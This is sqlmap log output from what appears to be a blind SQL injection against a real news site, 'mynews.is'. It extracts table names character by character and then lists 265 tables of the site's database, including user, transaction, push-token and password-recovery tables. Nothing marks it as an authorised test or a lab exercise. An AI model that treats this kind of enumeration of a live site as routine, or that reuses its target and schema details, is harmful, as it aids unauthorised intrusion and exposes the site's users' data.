+[03:24:26] [INFO] retrieved: _____________[03:24:26] [INFO] retrieved: [03:24:51] [INFO] retrieved: __e__________ 1/13 (7%)[03:24:58] [INFO] retrieved: __er_________ 2/13 (15%)[03:24:58] [INFO] retrieved: _ser_________ 3/13 (23%)[03:24:59] [INFO] retrieved: user_________ 4/13 (30%)[03:25:10] [INFO] retrieved: user__a______ 5/13 (38%)[03:25:28] [INFO] retrieved: user__an_____ 6/13 (46%)[03:25:28] [INFO] retrieved: user_lan_____ 7/13 (53%)[03:25:28] [INFO] retrieved: user_lang____ 8/13 (61%)[03:25:36] [INFO] retrieved: user_lang____ 9/13 (69%)[03:25:58] [INFO] retrieved: user_lang_n__ 10/13 (76%)[03:25:59] [INFO] retrieved: user_lang_nw_ 11/13 (84%)[03:26:02] [INFO] retrieved: user_lang_nwl 12/13 (92%)[03:26:05] [INFO] retrieved: user_lang_nwl             [03:26:05] [INFO] retrieved: user_lang_nwl
+[03:26:05] [INFO] retrieving the length of query output
+[03:26:05] [INFO] retrieved: 8
+[03:26:15] [INFO] retrieved: ________[03:26:15] [INFO] retrieved: [03:26:40] [INFO] retrieved: __e_____ 1/8 (12%)[03:26:47] [INFO] retrieved: u_e_____ 2/8 (25%)[03:26:47] [INFO] retrieved: u_er____ 3/8 (37%)[03:26:48] [INFO] retrieved: user____ 4/8 (50%)[03:27:05] [INFO] retrieved: user___b 5/8 (62%)[03:27:08] [INFO] retrieved: user_s_b 6/8 (75%)[03:27:08] [INFO] retrieved: user_sub 7/8 (87%)[03:27:13] [INFO] retrieved: user_sub           [03:27:13] [INFO] retrieved: user_sub
+[03:27:13] [INFO] retrieving the length of query output
+[03:27:13] [INFO] retrieved: 17
+[03:27:23] [INFO] retrieved: _________________[03:27:23] [INFO] retrieved: [03:27:47] [INFO] retrieved: __e______________ 1/17 (5%)[03:27:53] [INFO] retrieved: u_e______________ 2/17 (11%)[03:27:55] [INFO] retrieved: use______________ 3/17 (17%)[03:27:55] [INFO] retrieved: user_____________ 4/17 (23%)[03:28:07] [INFO] retrieved: user___a_________ 5/17 (29%)[03:28:15] [INFO] retrieved: user__ra_________ 6/17 (35%)[03:28:16] [INFO] retrieved: user_tra_________ 7/17 (41%)[03:28:28] [INFO] retrieved: user_tra__a______ 8/17 (47%)[03:28:28] [INFO] retrieved: user_tra__a______ 9/17 (52%)[03:28:36] [INFO] retrieved: user_tran_a______ 10/17 (58%)[03:28:37] [INFO] retrieved: user_transa______ 11/17 (64%)[03:28:44] [INFO] retrieved: user_transac_____ 12/17 (70%)[03:28:51] [INFO] retrieved: user_transact____ 13/17 (76%)[03:28:53] [INFO] retrieved: user_transacti___ 14/17 (82%)[03:29:04] [INFO] retrieved: user_transactio__ 15/17 (88%)[03:29:08] [INFO] retrieved: user_transaction_ 16/17 (94%)[03:29:09] [INFO] retrieved: user_transactions             [03:29:09] [INFO] retrieved: user_transactions
+[03:29:09] [INFO] retrieving the length of query output
+[03:29:09] [INFO] retrieved: 5
+[03:29:16] [INFO] retrieved: _____[03:29:16] [INFO] retrieved: [03:29:41] [INFO] retrieved: __e__ 1/5 (20%)[03:29:48] [INFO] retrieved: __es_ 2/5 (40%)[03:29:51] [INFO] retrieved: z_es_ 3/5 (60%)[03:29:52] [INFO] retrieved: ztes_ 4/5 (80%)[03:29:58] [INFO] retrieved: ztest           [03:29:58] [INFO] retrieved: ztest
+Database: db398975_1
+[265 tables]
++--------------------------+
+| 0articles                |
+| 13user_1                 |
+| 1art_key                 |
+| 1art_text                |
+| 1articles_1              |
+| 1categories              |
+| 1custom_sections         |
+| 1custom_tiles            |
+| 1fb_lists                |
+| 1freeuser_tiles          |
+| 1img_fbidden             |
+| 1keyw_evr                |
+| 1keyw_sem                |
+| 1keyw                    |
+| 1list_sources            |
+| 1lists                   |
+| 1main_sources            |
+| 1news_cat                |
+| 1news_key                |
+| 1news                    |
+| 1q_user_custom           |
+| 1q_user                  |
+| 1quser_similarity        |
+| 1shares                  |
+| 1sources_inapp_ad        |
+| 1sources                 |
+| 1sponsor_tiles           |
+| 1user_1                  |
+| 1user_2                  |
+| 1user_cat                |
+| 1user_lists_fol          |
+| 1user_sources            |
+| 1user_tiles              |
+| 2art_key                 |
+| 2art_text                |
+| 2articles_1              |
+| 2articles                |
+| 2categories              |
+| 2custom_sections         |
+| 2custom_tiles            |
+| 2freeuser_tiles          |
+| 2img_fbidden             |
+| 2keyw_sem                |
+| 2keyw                    |
+| 2list_sources            |
+| 2lists                   |
+| 2main_sources            |
+| 2news_cat                |
+| 2news_key                |
+| 2news                    |
+| 2shares                  |
+| 2sources_inapp_ad        |
+| 2sources                 |
+| 2sponsor_tiles           |
+| 2user_1                  |
+| 2user_2                  |
+| 2user_cat                |
+| 2user_lists_fol          |
+| 2user_sources            |
+| 2user_tiles              |
+| 3art_key                 |
+| 3art_text                |
+| 3articles_1              |
+| 3articles                |
+| 3categories              |
+| 3custom_sections         |
+| 3custom_tiles            |
+| 3freeuser_tiles          |
+| 3img_fbidden             |
+| 3keyw                    |
+| 3list_sources            |
+| 3lists                   |
+| 3main_sources            |
+| 3news_cat                |
+| 3news_key                |
+| 3news                    |
+| 3shares                  |
+| 3sources_inapp_ad        |
+| 3sources                 |
+| 3user_1                  |
+| 3user_3                  |
+| 3user_cat                |
+| 3user_lists_fol          |
+| 3user_sources            |
+| 3user_tiles              |
+| 4art_key                 |
+| 4art_text                |
+| 4articles_1              |
+| 4articles                |
+| 4categories              |
+| 4custom_sections         |
+| 4custom_tiles            |
+| 4freeuser_tiles          |
+| 4img_fbidden             |
+| 4keyw                    |
+| 4list_sources            |
+| 4lists                   |
+| 4main_sources            |
+| 4news_cat                |
+| 4news_key                |
+| 4news                    |
+| 4shares                  |
+| 4sources_inapp_ad        |
+| 4sources                 |
+| 4user_1                  |
+| 4user_4                  |
+| 4user_cat                |
+| 4user_lists_fol          |
+| 4user_sources            |
+| 5art_key                 |
+| 5art_text                |
+| 5articles_1              |
+| 5articles                |
+| 5categories              |
+| 5custom_sections         |
+| 5custom_tiles            |
+| 5freeuser_tiles          |
+| 5img_fbidden             |
+| 5keyw                    |
+| 5list_sources            |
+| 5lists                   |
+| 5main_sources            |
+| 5news_cat                |
+| 5news_key                |
+| 5news                    |
+| 5shares                  |
+| 5sources_inapp_ad        |
+| 5sources                 |
+| 5user_1                  |
+| 5user_5                  |
+| 5user_cat                |
+| 5user_lists_fol          |
+| 5user_sources            |
+| 6art_key                 |
+| 6art_text                |
+| 6articles_1              |
+| 6articles                |
+| 6categories              |
+| 6custom_sections         |
+| 6custom_tiles            |
+| 6freeuser_tiles          |
+| 6img_fbidden             |
+| 6keyw                    |
+| 6list_sources            |
+| 6lists                   |
+| 6main_sources            |
+| 6news_cat                |
+| 6news_key                |
+| 6news                    |
+| 6shares                  |
+| 6sources_inapp_ad        |
+| 6sources                 |
+| 6user_1                  |
+| 6user_6                  |
+| 6user_cat                |
+| 6user_lists_fol          |
+| 6user_sources            |
+| 7art_key                 |
+| 7art_text                |
+| 7articles_1              |
+| 7articles                |
+| 7categories              |
+| 7custom_sections         |
+| 7custom_tiles            |
+| 7freeuser_tiles          |
+| 7img_fbidden             |
+| 7keyw                    |
+| 7list_sources            |
+| 7lists                   |
+| 7main_sources            |
+| 7news_cat                |
+| 7news_key                |
+| 7news                    |
+| 7shares                  |
+| 7sources_inapp_ad        |
+| 7sources                 |
+| 7user_1                  |
+| 7user_7                  |
+| 7user_cat                |
+| 7user_lists_fol          |
+| 7user_sources            |
+| 99art_key                |
+| 99art_source             |
+| 99articles_1             |
+| 99articles               |
+| 99categories             |
+| 99keyw                   |
+| 99news_cat               |
+| 99news_key               |
+| 99news                   |
+| 99shares                 |
+| 99sources                |
+| 99user_1                 |
+| 99user_cat               |
+| 99user_sources           |
+| read                     |
+| user                     |
+| ad_newsletter            |
+| ads                      |
+| ads_stat                 |
+| app_codes                |
+| app_codes_temp           |
+| app_details              |
+| apps                     |
+| audio                    |
+| bod_categories           |
+| bod_followers            |
+| bod_instagram_posts      |
+| bod_lang                 |
+| bod_likes                |
+| bod_notifications        |
+| bod_posts                |
+| bod_push_tokens          |
+| bod_subscribe            |
+| bod_users                |
+| bod_versions             |
+| custom_user              |
+| custom_user_android      |
+| custom_user_lang         |
+| custom_user_lang_android |
+| custom_user_wc           |
+| email_fol_blog           |
+| email_stat               |
+| errors                   |
+| fb_p                     |
+| fb_pa                    |
+| fb_up                    |
+| fb_user                  |
+| fb_user2                 |
+| free_user                |
+| free_user_lang           |
+| freeread                 |
+| ios_push_token           |
+| ios_push_token_free      |
+| lang                     |
+| pages                    |
+| pass_recovery            |
+| read_premium             |
+| referals                 |
+| retention_day1           |
+| retention_month1         |
+| retention_week1          |
+| share_services           |
+| shared                   |
+| signup                   |
+| stat_visit               |
+| stat_visit_time          |
+| test                     |
+| track_cronjobs           |
+| track_sponsored_tile     |
+| transactions_ios         |
+| urlname                  |
+| urlname_source           |
+| user_articles            |
+| user_balance             |
+| user_blogs               |
+| user_data                |
+| user_details             |
+| user_fol_blogs           |
+| user_key                 |
+| user_lang                |
+| user_lang_nwl            |
+| user_sub                 |
+| user_transactions        |
+| ztest                    |
++--------------------------+
+
+[03:29:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/mynews.is'
+
+[*] ending @ 03:29:58 /2019-08-20/
+
